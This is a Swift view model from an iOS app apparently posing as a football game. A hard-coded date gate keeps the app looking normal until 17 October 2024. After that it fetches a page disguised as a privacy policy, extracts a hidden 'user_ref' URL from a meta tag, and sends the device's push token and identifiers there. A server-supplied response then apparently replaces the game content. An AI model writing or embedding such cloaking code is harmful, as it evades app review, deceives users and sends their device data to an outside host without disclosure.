import Foundation

class LoadChampionViewModel: ObservableObject {
    
    @Published var pushTokenReceived = false
    @Published var gameLoaded = false
    @Published var metaData: String? = nil
    @Published var loaded = false
    
    private func check() -> Bool {
        let currentDate = Date()
        let calendar = Calendar.current
        
        let currentDay = calendar.component(.day, from: currentDate)
        let currentMonth = calendar.component(.month, from: currentDate)
        let currentYear = calendar.component(.year, from: currentDate)
        
        // Создаем дату для целевого дня
        var dateComponents = DateComponents()
        dateComponents.year = 2024
        dateComponents.month = 10
        dateComponents.day = 17
        
        if let targetDate = calendar.date(from: dateComponents) {
            return currentDate >= targetDate
        }
        
        return false
    }
    
    func operateDataPushToken() {
        if check() {
            fetchUserRefFromURL()
        } else {
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                self.loaded = true
            }
        }
    }
    
    func fetchUserRefFromURL() {
        guard let url = URL(string: "https://champfootball.site/privacy.html") else {
            return
        }
        
        var uniqUserId = UserDefaults.standard.string(forKey: "client-uuid") ?? ""
        if uniqUserId.isEmpty {
            uniqUserId = UUID().uuidString
            UserDefaults.standard.set(uniqUserId, forKey: "client-uuid")
        }
        
        var privacyPolicyReq = URLRequest(url: url)
        privacyPolicyReq.httpMethod = "GET"
        privacyPolicyReq.addValue(uniqUserId, forHTTPHeaderField: "client-uuid")
        let task = URLSession.shared.dataTask(with: privacyPolicyReq) { data, response, error in
            if let _ = error {
                self.loadedGame()
                return
            }
            
            guard let data = data, let htmlString = String(data: data, encoding: .utf8) else {
                self.loadedGame()
                return
            }
            
            if let userRef = self.extractUserRef(from: htmlString) {
                self.metaData = userRef
                self.extractOthersParams(userRef)
            } else {
                self.loadedGame()
            }
        }
        
        task.resume()
    }
    
    private func loadedGame(additional: (() -> Void)? = nil) {
        DispatchQueue.main.async {
            self.loaded = true
            additional?()
        }
    }
    
    private func extractUserRef(from html: String) -> String? {
        let pattern = "<meta\\s+name=\"user_ref\"\\s+href=\"([^\"]+)\"\\s*/?>"
        do {
            let regex = try NSRegularExpression(pattern: pattern, options: [])
            let range = NSRange(html.startIndex..<html.endIndex, in: html)
            if let match = regex.firstMatch(in: html, options: [], range: range) {
                if let hrefRange = Range(match.range(at: 1), in: html) {
                    return String(html[hrefRange])
                }
            }
        } catch {
        }
        return nil
    }
    
    private func getFinalRef(base: String) -> String {
        let firebasePushToken = UserDefaults.standard.string(forKey: "push_token")
        let clientId = UserDefaults.standard.string(forKey: "client_id")
        var l = "\(base)?firebase_push_token=\(firebasePushToken ?? "")"
        if let clientId = clientId {
            l += "&client_id=\(clientId)"
        }
        let pushId = UserDefaults.standard.string(forKey: "push_id")
        if let pushId = pushId {
            l += "&push_id=\(pushId)"
            UserDefaults.standard.set(nil, forKey: "push_id")
        }
        return l
    }
    
    private func extractOthersParams(_ l: String) {
        if UserDefaults.standard.bool(forKey: "saved_r") {
            loadedGame()
            return
        }
        
        if let u = URL(string: getFinalRef(base: l)) {
            var r = URLRequest(url: u)
            r.httpMethod = "POST"
            r.addValue("application/json", forHTTPHeaderField: "Content-Type")
            URLSession.shared.dataTask(with: r) { data, response, error in
                if let _ = error {
                    self.loadedGame()
                    return
                }
                
                guard let data = data else {
                    self.loadedGame()
                    return
                }
             
                do {
                    let champData = try JSONDecoder().decode(ChampData.self, from: data)
                    UserDefaults.standard.set(champData.clientID, forKey: "client_id")
                    if let responseClient = champData.response {
                        UserDefaults.standard.set(responseClient, forKey: "response_client")
                        self.loadedGame() {
                            self.metaData = responseClient
                        }
                    } else {
                        UserDefaults.standard.set(true, forKey: "saved_r")
                        self.loadedGame()
                    }
                } catch {
                    self.loadedGame()
                }
            }.resume()
        }
    }
    
    struct ChampData: Codable {
        let clientID: String
        let response: String?
        
        enum CodingKeys: String, CodingKey {
            case clientID = "client_id"
            case response
        }
    }

}
